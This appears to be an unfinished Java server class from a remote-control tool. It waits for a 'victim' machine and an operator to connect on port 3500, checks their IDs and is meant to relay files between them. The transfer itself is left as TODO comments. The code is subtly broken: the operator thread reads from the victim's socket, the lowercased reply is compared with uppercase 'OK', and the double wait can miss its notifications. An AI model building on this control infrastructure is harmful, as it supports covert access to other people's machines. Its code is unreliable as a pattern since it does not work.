package Modele;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

import Interfaces.Observable;
import Interfaces.ObservableUser;
import Interfaces.Observateur;


//Ce thread ne doit etre lance qu'à chaque instance d'envoit de fichier, il doit donc se mettre en ecoute et n'accepter que les connexions attendues, c'est a dire des 
// observables qui ont les bons ids.
public class ConnexionEnvoiFichier extends Thread{

	public static int port = 3500;
	
	private ServerStart startServeur;
	private ServerSocket serveur;
	private Observable victim;
	private ObservableUser user;
	private Socket socVictim;
	private Socket socUser;
	
	
	public ConnexionEnvoiFichier(Observateur start, ServerSocket s, Observable victim, ConnexionUser utilisateur) {
		this.serveur = s;
		this.victim = victim;
		this.user = utilisateur;
		this.startServeur = (ServerStart) start;
	}
	
	
	public void run() {
		
		Thread t_victim = new Thread() {

			public void run() {
				boolean CheckID = false;
				
				try {
					Socket socketVictim = null;
					while(CheckID == false) {
						socketVictim = serveur.accept();
						BufferedInputStream readerCheck = new  BufferedInputStream(socVictim.getInputStream());
						byte data [] = new byte [2];
						readerCheck.read(data, 0, 1);
						if(victim.getIdInstance() == data[0])
							CheckID = true;
					}					
					socVictim = socketVictim;
					synchronized (getThis()) {
						getThis().notify();						
					}
				} catch (IOException e) {
					e.printStackTrace();
				}
			}

		};	
		
		Thread t_user = new Thread() {

			public void run() {
				boolean CheckID = false;
				
				try {
					Socket socketUser = null;
					while(CheckID == false) {
						socketUser = serveur.accept();
						BufferedInputStream readerCheck = new  BufferedInputStream(socVictim.getInputStream());
						byte data [] = new byte [2];
						readerCheck.read(data, 0, 1);
						if(user.getId() == data[0])
							CheckID = true;
					}					
					socUser = socketUser;
					synchronized (getThis()) {
						getThis().notify();						
					}
				} catch (IOException e) {
					e.printStackTrace();
				}
			}

		};	
		
		t_victim.start();
		t_user.start();
				
		try {
			synchronized (this) {
				this.wait();
				this.wait();				
			}
			
			this.startServeur.getListConnexionEnvoiFichier().add(this);
			
			//TODO coder l'envoi ici (debut envoi)

			try {
				BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(this.socVictim.getOutputStream()));
				BufferedReader reader = new BufferedReader(new InputStreamReader(this.socVictim.getInputStream()));
				
				
				String reponse = reader.readLine();
				if(!reponse.toLowerCase().startsWith("OK")) {// Mot code aussi
					this.ToutAnnuler("Mauvais accuse de reception de la victime -> ne vaut pas OK -> Vous avez entre un chemin incorrect\n\n");
					return;
				} else this.user.envoyerMessage("Envoi de fichier demarre !!! :) ");
				
				//TODO ---> Lancer l'envoi de fichiers <----
				
				//Gerer le code chez la victime
				//Gerer le code chez l'utilisateur
					
				
			} catch (IOException e) {
				this.ToutAnnuler("envoi abandonne");
			}
			
			
			//Verification de la possibilite d'envoyer (bon path)
			
			
			
			
			
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
	
	
	public ConnexionEnvoiFichier getThis() {
		return this;
	}
	
	public ObservableUser getUser() {
		return user;
	}
	
	public Observable getVictim() {
		return victim;
	}
	
	public void ToutAnnuler(String message){
		try {
			this.socUser.close();
		} catch (IOException e) {
		}
		try {
			this.socVictim.close();
		} catch (IOException e) {
		}
		this.startServeur.getListConnexionEnvoiFichier().remove(this);
		this.user.envoyerMessage("Erreur lors de l'envoi de fichiers : "+message);
	}
}
